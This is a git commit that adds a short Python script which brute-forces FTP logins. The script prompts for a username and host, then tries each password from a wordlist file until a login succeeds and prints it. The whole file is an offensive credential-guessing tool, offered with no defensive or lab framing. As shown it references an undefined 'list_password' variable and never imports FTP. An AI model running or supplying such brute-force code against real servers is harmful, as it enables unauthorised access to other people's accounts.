90c4f566dc3c27830734bbe198753d04df0ffdeb
Youssef Dabachin <labagnole@outlook.fr>
2021-07-25 15:16:19 +0200

    fonction bruteforce avec une wordlist

---
+++ bruteforce_wordlist.py
@@ -0,0 +1,22 @@
+def bruteforce_dico():
+    username = input("saisissez le nom d'utilisateur:")
+    host = input("saisissez le host:")
+
+    # username = "test"
+    # host = "127.0.0.1"
+
+    def start():
+        t = []
+        f = open(list_password)
+        t = f.readlines()
+        for password in t:
+            password = password.strip()
+            try:
+                ftp = FTP(host)
+                ftp.login(user=username, passwd=password)
+                print("Success:", str(password))
+                break
+            except Exception as e:
+                print("Erreur:", str(e), "  -  ", password)
+
+    start()
